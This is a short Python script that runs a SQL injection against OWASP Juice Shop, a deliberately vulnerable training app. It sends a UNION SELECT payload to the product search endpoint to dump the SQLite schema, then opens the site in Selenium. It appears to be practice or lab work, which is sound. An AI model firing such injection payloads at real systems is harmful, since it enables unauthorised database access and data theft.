import requests
import os
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

try:
	IP_ADDRESS = os.environ['OWASP_JUICE_SHOP_IP_ADDRESS']
	PORT = os.environ['OWASP_JUICE_SHOP_PORT']
	# Define the API endpoint URL
	url = f"http://{IP_ADDRESS}:{PORT}/rest/products/search"

	# Prepare the JSON payload for the request body
	payload = {"q": "qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--" }

	# Send the GET request with parameters
	response = requests.get(url, params=payload)

	# Print the response status code and JSON content
	print(f"Status Code: {response.status_code}")
	print(f"Response Body: {response.json()}")

	driver = webdriver.Chrome()
	driver.get(f"http://{IP_ADDRESS}:{PORT}")

	# Open the homepage
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
	input("Press Enter...")

except Exception as e:
    print(f"An error occurred: {e}")

finally:
  driver.quit()
